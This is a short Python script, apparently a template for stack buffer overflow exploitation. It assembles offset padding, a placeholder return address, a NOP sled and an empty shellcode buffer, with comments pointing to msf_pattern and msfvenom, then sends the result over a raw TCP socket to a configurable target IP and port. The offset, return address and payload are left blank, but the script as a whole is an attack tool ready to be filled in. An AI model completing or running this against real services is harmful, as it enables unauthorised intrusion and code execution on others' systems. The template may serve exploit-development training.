import sys,socket,time

NOP_PADDING_NB = 32 # Get it higher if needed
OFFSET_NB = 0 # Find the offset where the program breaks (checkout msf_pattern and dynamic debugging tools)
TARGET_IP = '0.0.0.0'
TARGET_PORT = 3748

offset = b'a'*OFFSET_NB
esp_addr = b'' # the address of the return function, we want it to execute our code (make sure to write it in reverse if its little endian)
nop_set = b'\x90'* NOP_PADDING_NB

# Under this line, you can input your encoded exploit (checkout msfvenom)
buf =  b""

# one line to gather everything
msg = offset + esp_addr + nop_set + buf

try:
	print("...Payloading this thing...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	print("payload created")
	s.connect((TARGET_IP,TARGET_PORT))
	time.sleep(1)
	s.send(msg + b'\r\n')
	print('msg sent')
	s.recv(1024)
	s.close()
except:
	print("something failed")
	sys.exit()
